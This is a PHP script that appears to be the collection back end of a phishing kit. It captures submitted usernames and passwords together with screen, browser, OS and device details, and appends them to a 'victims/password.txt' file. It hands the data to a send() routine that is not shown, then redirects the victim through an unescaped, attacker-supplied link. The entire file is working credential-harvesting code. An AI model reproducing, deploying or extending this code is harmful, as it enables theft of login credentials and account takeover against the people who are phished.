<?php
include("iplogger.php");
if ($_SERVER['REQUEST_METHOD'] === 'POST') 
{		   
    $user_agent = $_SERVER['HTTP_USER_AGENT'];                                                                //Get User agent
    $data = "username:" .$_POST['username']."\n".                                                             //Append username
            "password:" .$_POST['password']."\n".                                                             //Append password
	    "Page:"     .$_POST['location']."\n";                                                             //Append page
    //$data .= file_get_contents("http://ip-api.com/json");                                                     //Get data
    //$data = str_replace(',',"\n",$data);                                                                      //Replace , with newline
    //$data = str_replace('"','',$data);                                                                        //Remove "
    //$data = str_replace('{','',$data);                                                                        //Remove {
    //$data = str_replace('}','',$data);                                                                        //Remove }
    $data .= "Screen:".$_COOKIE['Width']."x".$_COOKIE['Height']."\n";                                       //Append Screen Size
    $data .= "User Agent:".$user_agent."\n";                                                                //Append User agent
    $data .= "OS:".Operating_System($user_agent)."\n";                                                      //Append Operating System
    $data .= "Browser:".Browser($user_agent)."\n";                                                          //Append Browser
    $data .= "Device:".Device($user_agent)."\n";                                                            //Append Device
    
    File_Put_Contents(".././victims/password.txt", $data, FILE_APPEND);                                       //Append data to file
    send($data);	
}
echo "<script>window.location.replace('".$_POST['link']."');</script>";
?>
